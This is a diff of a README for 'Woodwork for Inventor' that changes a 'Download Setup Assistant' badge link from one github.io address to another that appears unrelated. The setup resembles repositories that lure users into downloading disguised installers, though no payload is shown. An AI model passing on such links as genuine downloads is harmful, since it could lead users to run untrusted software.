@@ -1,6 +1,6 @@
 # Woodwork for Inventor 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://woodworkinventor-downloadtool.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://laurahancock1969.github.io/.github/woodwork-for-inventor)
 
 ## ⚙️ How to Use
 
